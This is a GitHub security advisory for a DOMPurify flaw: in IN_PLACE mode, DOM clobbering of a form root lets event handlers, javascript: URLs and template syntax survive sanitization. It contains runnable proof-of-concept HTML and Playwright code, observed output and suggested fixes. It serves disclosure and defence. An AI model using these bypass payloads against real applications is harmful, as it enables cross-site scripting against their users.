# [M] DOMPurify: IN_PLACE mode preserves attributes of a clobbered root element, allowing XSS via attacker-controlled root DOM

## Summary
Severity: Medium
Advisory: GHSA-r47g-fvhr-h676
CVE: CVE-2026-49459
CWE: CWE-1321, CWE-693, CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-06-15
Source: https://github.com/advisories/GHSA-r47g-fvhr-h676
Type: github-advisory

## Affected
- npm: `dompurify` — affected >=0 <3.4.6

## Details
# IN_PLACE mode preserves attributes of a clobbered root element, allowing XSS via attacker-controlled root DOM

**CWE**: CWE-79 (XSS — Improper Neutralization of Input During Web Page Generation) via CWE-693 (Protection Mechanism Failure — silent no-op when `_forceRemove` is called on a parent-less node)

## Summary

When `DOMPurify.sanitize(root, { IN_PLACE: true })` is called and `root` is a `<form>` whose own attributes carry an event handler (`onmouseover`, `onfocus`, `onclick`, etc.), a single descendant element with a `name=` attribute matching any of the property names `_isClobbered` checks (`nodeName`, `setAttribute`, `namespaceURI`, `insertBefore`, `hasChildNodes`, `childNodes`) is sufficient to bypass attribute sanitization on the root. `_forceRemove` silently no-ops because the root has no parent; the iterator drives on to `_sanitizeAttributes`, which early-returns on clobbered nodes — and the event handler attribute is never inspected. The sanitized return is the same root, with the handler live.

This affects current `main` at `89da34e` (the just-landed DOM-clobbering hardening fix at `89da34e` addressed `_sanitizeAttachedShadowRoots` walk traversal, **not** the main `_sanitizeElements` / `_sanitizeAttributes` pipeline against the iterator-root node).

## Affected

- DOMPurify ≤ 3.4.5, including `main` at `89da34e03ec17868e561f87f3747a9371b61a9e7`
- Any caller that does `DOMPurify.sanitize(node, { IN_PLACE: true })` where `node` is built from untrusted HTML (e.g., parsed via `createElement('template').innerHTML = dirty` then `template.content.firstElementChild` handed in)

Not affected:
- String-input `DOMPurify.sanitize(dirtyString)` — the library builds the DOM itself inside `_initDocument`, the root is the cleanly-created document body, and clobber-named children of the body cannot shadow `body` named properties (HTMLBodyElement does not carry `[LegacyOverrideBuiltIns]`)
- IN_PLACE where the root is not an HTMLFormElement
- IN_PLACE where the attacker cannot place a clobber-named child inside the root

## Vulnerability details

### Code paths

**[A]** — `_forceRemove` at `src/purify.ts:930-939`:

```ts
const _forceRemove = function (node: Node): void {
  arrayPush(DOMPurify.removed, { element: node });
  try {
    // eslint-disable-next-line unicorn/prefer-dom-node-remove
    getParentNode(node).removeChild(node);   // [A1] throws when getParentNode returns null
  } catch (_) {
    remove(node);                             // [A2] WebIDL Node.remove() — spec-defined no-op
  }                                           //      when the node has no parent
};
```

When the iterator-root has no parent (the standard IN_PLACE case where the caller hands in a detached node), `getParentNode(node)` returns `null`, `null.removeChild(node)` throws, the catch falls to `remove(node)` — which per WebIDL is `Element.prototype.remove.call(node)`, and per spec **does nothing if the node has no parent**. Nothing about `_forceRemove`'s contract acknowledges this — the function appears to its callers as "the node is gone now," but the node is still in place.

**[B]** — `_sanitizeAttributes` at `src/purify.ts:1490-1492`:

```ts
const _sanitizeAttributes = function (currentNode: Element): void {
  _executeHooks(hooks.beforeSanitizeAttributes, currentNode, null);

  const { attributes } = currentNode;

  /* Check if we have attributes; if not we might have a text node */
  if (!attributes || _isClobbered(currentNode)) {
    return;                                   // [B] silently skips ALL attribute checks
  }                                           //     for clobbered nodes
  ...
};
```

The skip at `[B]` is deliberate — the intent is to avoid touching nodes the library has already decided to discard. The invariant the comment implies is *"if `_isClobbered`, then `_sanitizeElements` already removed this node, so we will never reach `_sanitizeAttributes` on it."* That invariant holds for every non-root node (their `_forceRemove` succeeds in detaching them), but fails for the iterator root in IN_PLACE mode.

**The mismatch** is between [A] and [B]: [A] assumes "removal" means the node will not be observed again, and [B] assumes any clobbered node it sees has already been removed. Neither holds for the iterator root. A correct guard would either make `_forceRemove` fail loudly on parent-less nodes (so the caller can bail out of IN_PLACE entirely) or have `_sanitizeAttributes` strip attributes from clobbered roots before returning.

### Iterator call site

`src/purify.ts:1850-1864` ignores the boolean return value of `_sanitizeElements`:

```ts
const nodeIterator = _createNodeIterator(IN_PLACE ? dirty : body);

while ((currentNode = nodeIterator.nextNode())) {
  _sanitizeElements(currentNode);       // returns `true` if killed — IGNORED
  _sanitizeAttributes(currentNode);     // runs unconditionally; relies on [B]'s skip
  ...
}
```

If the return value were checked and `_sanitizeAttributes` skipped when the node was "killed," the bug would not exist as a discrete issue — but currently `_sanitizeAttributes` is the only line of defense for a node that `_sanitizeElements` could not actually detach.

### Why the clobber works

In Chromium/WebKit/Firefox, `HTMLFormElement` carries the WebIDL `[LegacyOverrideBuiltIns]` extended attribute on its named-property getter. A descendant element with `name="X"` (or `id="X"`, for radio-button-like names) shadows the matching property on the form, including properties inherited from `Element`, `Node`, and `EventTarget` prototypes. This is the same primitive the just-landed `89da34e` fix addresses for shadow-root traversal, but `_isClobbered`'s typeof checks (and the bypass-by-detection-failure path here) are independent of that fix.

Verified clobber targets (each name= value independently triggers `_isClobbered`):

| `name=` value | property `_isClobbered` checks | typeof on clobbered form |
|---|---|---|
| `nodeName` | `typeof element.nodeName !== 'string'` | object (an `<INPUT>`) |
| `setAttribute` | `typeof element.setAttribute !== 'function'` | object (not callable) — *but* `<embed>`/`<applet>`/`<iframe>` ARE callable; see "Note on callable elements" below |
| `namespaceURI` | `typeof element.namespaceURI !== 'string'` | object |
| `insertBefore` | `typeof element.insertBefore !== 'function'` | object |
| `hasChildNodes` | `typeof element.hasChildNodes !== 'function'` | object |
| `childNodes` | `!(element.childNodes && typeof element.childNodes.length === 'number')` | object — `<INPUT>` has no `.length` |
| `attributes` | `!(element.attributes instanceof NamedNodeMap)` | object (an `<INPUT>` is not a NamedNodeMap) |
| `textContent` | `typeof element.textContent !== 'string'` | object |
| `removeChild` | `typeof element.removeChild !== 'function'` | object (non-callable) |
| `removeAttribute` | `typeof element.removeAttribute !== 'function'` | object (non-callable) |

Any single one of the ten property names in `_isClobbered`'s checklist is sufficient as the bypass trigger.

## Proof of concept

### (1) Minimal — runnable in a single browser context

```html
<!doctype html>
<html><body>
<script src="dist/purify.js"></script>
<script>
  const root = document.createElement('form');
  root.setAttribute('onmouseover', 'window.__rooted = 1');
  const clobber = document.createElement('input');
  clobber.setAttribute('name', 'nodeName');
  root.appendChild(clobber);

  // typeof root.nodeName === 'object' (an <INPUT> element), not 'string'.
  // _isClobbered fires; _forceRemove(root) becomes a no-op because root.parentNode === null.
  DOMPurify.sanitize(root, { IN_PLACE: true });

  console.log('output:', root.outerHTML);
  // <form onmouseover="window.__rooted = 1"><input name="nodeName"></form>
  //  ^^^^^^^^^^^^^^^^^^ event handler survived ^^^^^^^^^^^^^^^^^^

  document.body.appendChild(root);
  root.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }));
  console.log('handler fired:', window.__rooted === 1);  // true
</script>
</body></html>
```

### (2) End-to-end — Playwright against `main` HEAD

```js
const { chromium } = require('playwright');
const path = require('path');

(async () => {
  const browser = await chromium.launch();
  const page = await browser.newPage();
  await page.setContent('<!doctype html><html><body></body></html>');
  await page.addScriptTag({ path: path.resolve('dist/purify.js') });

  const result = await page.evaluate(() => {
    const root = document.createElement('form');
    root.setAttribute('onmouseover', 'window.__rooted = 1');
    const clobber = document.createElement('input');
    clobber.setAttribute('name', 'nodeName');
    root.appendChild(clobber);

    DOMPurify.sanitize(root, { IN_PLACE: true });

    document.body.appendChild(root);
    window.__rooted = 0;
    root.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }));

    return {
      version: DOMPurify.version,
      output: root.outerHTML,
      handlerFired: window.__rooted === 1,
    };
  });
  console.log(result);
  await browser.close();
})();
```

Observed (Chromium 148.0.7778.96, DOMPurify 3.4.5, HEAD `89da34e`):

```
{
  version: '3.4.5',
  output: '<form onmouseover="window.__rooted = 1"><input name="nodeName"></form>',
  handlerFired: true
}
```

### (3) Variant matrix — six distinct clobber-target properties

Every property name in `_isClobbered`'s typeof checklist works as the bypass trigger:

```
[BYPASS] name="nodeName"      → <form onmouseover="…"><input></form>
[BYPASS] name="setAttribute"  → <form onmouseover="…"><input></form>
[BYPASS] name="namespaceURI"  → <form onmouseover="…"><input></form>
[BYPASS] name="insertBefore"  → <form onmouseover="…"><input></form>
[BYPASS] name="hasChildNodes" → <form onmouseover="…"><input></form>
[BYPASS] name="childNodes"    → <form onmouseover="…"><input></form>
```

This makes the fix less of a one-line patch — every property `_isClobbered` checks for the typeof-spoofing pattern needs to be considered.

## Impact

### Direct

Two distinct impact paths from the same root-attribute-survival primitive:

**(a) XSS via event-handler attribute on the surviving root.** Any consumer that uses `DOMPurify.sanitize(node, { IN_PLACE: true })` where `node` originated from untrusted HTML and is re-inserted into the live document is vulnerable to XSS. The typical pattern is:

```js
const t = document.createElement('template');
t.innerHTML = untrustedHtml;
DOMPurify.sanitize(t.content.firstElementChild, { IN_PLACE: true });
container.appendChild(t.content.firstElementChild);
```

If `untrustedHtml` is `<form onmouseover=…><input name=nodeName>…</form>`, the resulting node has the `onmouseover` attribute intact when re-inserted into the live document.

**(b) Every attribute-level defense is bypassed on the surviving root, not just event handlers.** The `_sanitizeAttributes` early-return at `:1490` skips the entire attribute walk for clobbered nodes, so the root preserves attributes that the attribute walk would otherwise sanitize. Verified additional attributes that survive:

- **`action="javascript:..."` and `formaction="javascript:..."`** — URI validation at `:1413` never runs. A user click on a submit button inside the sanitized form navigates to the `javascript:` URL, executing the handler. Adds a click-triggered XSS path on top of the mouseover/focus event-handler attributes already documented.
- **`id="<colliding-name>"`** — the DOM-clobbering guard at `:1352-1359` (`SANITIZE_DOM && (lcName === 'id' || lcName === 'name') && (value in document || value in formElement)`) lives inside `_sanitizeAttributes` and is skipped. An attacker can therefore land `id="cookie"`, `id="body"`, `id="head"`, `id="firstChild"`, etc. on the surviving form root and use it as a DOM-clobbering primitive against any consumer code that does `document.cookie`, `document.body`, etc.
- **`target="_top"`**, **`autofocus`**, **`formenctype`**, **`formmethod`** — all survive untouched.
- **Custom event handlers DOMPurify wouldn't have explicit list entries for** (e.g., newly-spec'd `oncontentvisibilityautostatechange`) survive on the clobbered root via the same skip; the per-name allow-list at `:1361-1364` never runs.

Verified — full attribute set survives on a single payload (PoC):

```js
const root = document.createElement('form');
root.setAttribute('action', 'javascript:alert(1)');
root.setAttribute('target', '_top');
root.setAttribute('onclick', 'alert(2)');
root.setAttribute('onmouseover', 'alert(3)');
root.setAttribute('autofocus', '');
root.setAttribute('formaction', 'javascript:alert(4)');
root.setAttribute('id', 'cookie');           // DOM-clobbering primitive
root.innerHTML += '<input name="nodeName">';
DOMPurify.sanitize(root, { IN_PLACE: true });
console.log(root.outerHTML);
// <form action="javascript:alert(1)" target="_top" onclick="alert(2)"
//       onmouseover="alert(3)" autofocus="" formaction="javascript:alert(4)"
//       id="cookie"><input></form>
```

**(c) Defense-in-depth re-sanitization on the same node is INEFFECTIVE — the clobber is sticky.** Chromium's `HTMLFormElement` named-property cache appears to retain the named child reference even after the child's `name` attribute is removed during the sanitization pass. Empirically verified — after the first sanitize pass, the input's `name="nodeName"` attribute is correctly stripped (the output shows `<input>` with no attributes), yet `typeof form.nodeName === 'object'` is still true and the input element is still returned. Calling `DOMPurify.sanitize(sameNode, { IN_PLACE: true })` a second time hits the same `_isClobbered` → `_forceRemove` → `_sanitizeAttributes` early-return path. The only effective recovery is serialize-then-reparse:

```js
const root = parseAttackerHtml();                                     // form with input name="nodeName" child
DOMPurify.sanitize(root, { IN_PLACE: true });                         // bypass: attrs survive
DOMPurify.sanitize(root, { IN_PLACE: true });                         // STILL bypassed: attrs survive
const recovered = (() => {
  const t = document.createElement('template');
  t.innerHTML = root.outerHTML;                                       // forces a fresh parse
  const r = t.content.firstElementChild;
  DOMPurify.sanitize(r, { IN_PLACE: true });
  return r;
})();
// recovered.outerHTML === '<form><input></form>'  ← finally clean
```

A "belt-and-suspenders" caller that re-runs DOMPurify on its own output is therefore not protected against this primitive on Chromium; the obvious mitigation pattern fails silently. Any user-side workaround needs to route through a string round-trip.

**(d) SAFE_FOR_TEMPLATES bypass for the root's attributes.** When the caller sets `SAFE_FOR_TEMPLATES: true` to defend a downstream template engine (Vue, Angular, Liquid, Handlebars, …) from receiving `{{…}}` / `<%…%>` / `${…}` syntax through DOMPurify's output, attribute-level template-syntax stripping runs in the same `_sanitizeAttributes` pass that early-returns on clobbered roots (`:1572-1576`). The root's attributes therefore retain raw template syntax that the downstream engine then evaluates.

Verified — same PoC structure, with `SAFE_FOR_TEMPLATES: true`:

```js
const root = document.createElement('form');
root.setAttribute('title', '{{evil}}');
root.setAttribute('onmouseover', 'window.__x=1');
const c = document.createElement('input');
c.setAttribute('name', 'nodeName');
root.appendChild(c);

DOMPurify.sanitize(root, { IN_PLACE: true, SAFE_FOR_TEMPLATES: true });

console.log(root.outerHTML);
// <form title="{{evil}}" onmouseover="window.__x=1"><input></form>
//        ^^^^^^^^^^^^^^^^ template syntax survives
```

This compounds with (a): a single payload exfiltrates via XSS (immediate) and via SSTI to downstream renderers (delayed).

(Text-node content inside the form is still scrubbed correctly — `_scrubTemplateExpressions` at `:1868-1870` walks text/comment/CDATA/PI nodes independently and reaches them via the iterator. Only attribute values on the clobbered root escape.)

### Indirect / second-order

- **DOM-based template systems / editors** that wrap DOMPurify with an IN_PLACE call for parsed user content (CMSes, comment widgets, WYSIWYG editors persisting structured HTML).
- **Email/HTML preview libraries** that pre-parse received HTML before sanitization for performance reasons.
- **Frameworks that hand DOMPurify a node tree** rather than a string — including, indirectly, any code path that does `el.innerHTML = …; DOMPurify.sanitize(el, { IN_PLACE: true })`. The outer `el` is fine (it's not the form), but if the *first child* of `el` is taken as the sanitization root in a different code path, the bypass triggers.

### Why current `main` is also vulnerable

Commit `89da34e` ("fix: fixed a possible DOM clobbering with IN_PLACE and shadow DOM") hardens `_sanitizeAttachedShadowRoots` via three new cached prototype getters (`getShadowRoot`, `getNodeName`, `getNodeType`) and an `_isClobbered` extension that checks `element.childNodes.length`. The fix is correct for its scope — shadow-root traversal — but does not change `_forceRemove`'s parent-less-node behavior or `_sanitizeAttributes`'s clobber-skip early-return. The bypass demonstrated here is in the IN_PLACE main pipeline, not the shadow-root walk, and the verification PoC above runs against HEAD `89da34e` and still succeeds.

## Suggested fix

Two minimal-risk options:

1. **Make `_forceRemove` honest about failure**: return whether the node was actually detached, and have the iterator call site honor that.

   ```ts
   const _forceRemove = function (node: Node): boolean {
     arrayPush(DOMPurify.removed, { element: node });
     try {
       getParentNode(node).removeChild(node);
       return true;
     } catch (_) {
       try { remove(node); } catch (_) {}
       return node.parentNode === null && /* but still attached to itself */ false;
     }
   };
   ```
   Then at `:1855`, if `_sanitizeElements` returns true AND IN_PLACE, force-strip all attributes of the root before returning the dirty tree. (This is what the user expects — sanitization either succeeds or refuses to return a "sanitized" handle to an unsanitized tree.)

2. **Strip attributes inside `_sanitizeAttributes` for clobbered roots**: when `_isClobbered(currentNode)` is true at `:1490`, instead of early-returning, iterate `currentNode.attributes` (using the cached `getAttributes` if you add one) and remove each via `removeAttribute`. This preserves the existing semantics for non-root clobbered nodes (their attributes-of-a-removed-node will be GC'd anyway) and removes the attack surface for root.

3. **Refuse IN_PLACE on parent-less clobbered roots**: at the top of the iterator, check that the root either has a parent OR is not `_isClobbered`. If both fail, throw. This is the most defensive option but breaks any existing caller that hands in a clobbered detached root expecting "sanitized = empty/safe."

### Note on callable elements

In Chromium and WebKit, `HTMLEmbedElement`, `HTMLAppletElement`, `HTMLIFrameElement`, and `HTMLScriptElement` have `typeof === 'function'` because they expose plugin/iframe `[[Call]]` traps at the WebIDL level. A `name="setAttribute"` *child* of one of these tags spoofs the `setAttribute typeof === 'function'` check — but only matters for the *attribute re-set* path at `:1619`, not the bypass demonstrated here (which uses `nodeName` and friends). The callable-element vector is worth checking separately as a potential `SAFE_FOR_TEMPLATES`-bypass primitive; the present report does not depend on it.

## References
- https://github.com/cure53/DOMPurify/security/advisories/GHSA-r47g-fvhr-h676
- https://github.com/cure53/DOMPurify
